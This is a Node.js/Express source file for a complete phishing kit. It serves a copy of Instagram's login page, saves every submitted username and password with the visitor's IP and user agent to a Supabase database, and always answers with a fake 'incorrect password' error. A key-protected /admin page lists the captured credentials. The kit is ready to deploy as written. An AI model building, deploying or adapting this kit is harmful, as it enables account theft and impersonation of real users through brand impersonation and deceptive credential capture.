const express = require('express');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_KEY
);

const FIELD_USER = 'username';
const FIELD_PASS = 'password';

const HTML = (showError) => `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
:root{--bg:#fafafa;--box-bg:#fff;--border:#dbdbdb;--text:#262626;--text-secondary:#8e8e8e;--input-bg:#fafafa;--link:#0095f6}
@media(prefers-color-scheme:dark){:root{--bg:#000;--box-bg:#000;--border:#363636;--text:#f5f5f5;--text-secondary:#a8a8a8;--input-bg:#121212;--link:#0095f6}}
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
body{background:var(--bg);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:350px;display:flex;flex-direction:column;align-items:center}
.box{background:var(--box-bg);border:1px solid var(--border);padding:40px 40px 20px;width:100%;margin-bottom:10px;text-align:center}
.logo{font-size:36px;color:var(--text);margin-bottom:15px;font-family:cursive}
.error-msg{background:rgba(237,73,86,0.1);border:1px solid #ed4956;color:#ed4956;padding:8px 12px;border-radius:4px;font-size:12px;margin-bottom:10px;display:${showError?'block':'none'}}
form{display:flex;flex-direction:column;gap:6px;margin-top:8px}
input{width:100%;padding:9px 0 7px 8px;background:var(--input-bg);border:1px solid var(--border);border-radius:3px;font-size:12px;color:var(--text);outline:none}
input::placeholder{color:var(--text-secondary)}
input:focus{border-color:#a8a8a8}
.btn-login{width:100%;padding:7px 16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.btn-login:hover{opacity:0.9}
.or-divider{display:flex;align-items:center;margin:15px 0;gap:18px}
.or-divider .line{flex:1;height:1px;background:var(--border)}
.or-divider span{color:var(--text-secondary);font-size:12px;font-weight:600}
.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;background:none;border:none;color:#385185;font-size:14px;font-weight:600;cursor:pointer;margin:10px 0;padding:8px}
.forgot{display:block;color:var(--link);font-size:12px;text-decoration:none;margin-top:12px}
.signup-box{background:var(--box-bg);border:1px solid var(--border);padding:20px 40px;width:100%;text-align:center;font-size:14px;color:var(--text)}
.signup-box a{color:var(--link);font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="box">
<div class="logo">Instagram</div>
<div class="error-msg" id="errorMessage">Sorry, your password was incorrect. Please double-check your password.</div>
<form method="POST" action="/login">
<input type="text" name="${FIELD_USER}" placeholder="Phone number, username or email" required>
<input type="password" name="${FIELD_PASS}" placeholder="Password" required>
<button type="submit" class="btn-login">Log in</button>
</form>
<div class="or-divider"><div class="line"></div><span>OR</span><div class="line"></div></div>
<button class="fb-login">Log in with Facebook</button>
<a href="#" class="forgot">Forgotten your password?</a>
</div>
<div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body>
</html>`;

app.get('/', (req, res) => {
  res.send(HTML(req.query.error === 'invalid'));
});

app.post('/login', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';
  const username = (req.body[FIELD_USER] || '').trim();
  const password = req.body[FIELD_PASS] || '';
  
  if (!username || !password) return res.redirect('/?error=invalid');

  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
  const userAgent = req.headers['user-agent'] || 'Unknown';

  try {
    const { error } = await supabase
      .from('credentials')
      .insert([{ timestamp, ip, username, password, user_agent: userAgent }]);
    if (error) console.error('DB error:', error);
    else console.log('[+]', username, ':', password, 'from', ip);
  } catch(e) {
    console.error('DB exception:', e.message);
  }

  res.redirect('/?error=invalid');
});

app.get('/admin', async (req, res) => {
  if (req.query.key !== 'P3nt3st3r!2024') {
    return res.status(401).send('Access denied.');
  }

  let data = [];
  try {
    const { data: d, error } = await supabase
      .from('credentials')
      .select('*')
      .order('id', { ascending: false });
    if (!error) data = d || [];
  } catch(e) {}

  const rows = data.map((e, i) => 
    `<tr><td>${i+1}</td><td>${e.timestamp}</td><td>${e.ip}</td><td>${e.username}</td><td style="color:#ff6b6b;">${e.password}</td></tr>`
  ).join('');

  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Captured</title>
<style>
body{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ff00;padding:20px}
h1{color:#ff4444}table{width:100%;border-collapse:collapse;margin-top:20px}
th{background:#1a1a1a;color:#ff4444;padding:10px;text-align:left;border-bottom:2px solid #333}
td{padding:10px;border-bottom:1px solid #222;word-break:break-all}tr:hover{background:#111}
.stats{margin:20px 0;display:flex;gap:20px}
.stat-box{background:#1a1a1a;border:1px solid #333;padding:15px;border-radius:4px}
.num{font-size:28px;font-weight:bold;color:#00ff00}
.label{color:#888;font-size:12px}
</style></head>
<body>
<h1>CAPTURED CREDENTIALS</h1>
<div class="stats">
<div class="stat-box"><div class="num">${data.length}</div><div class="label">Total</div></div>
<div class="stat-box"><div class="num">${new Set(data.map(e=>e.ip)).size}</div><div class="label">Unique IPs</div></div>
</div>
<table><tr><th>#</th><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>
${rows || '<tr><td colspan="5" style="text-align:center;color:#666;">No captures yet</td></tr>'}
</table></body></html>`);
});

module.exports = app;
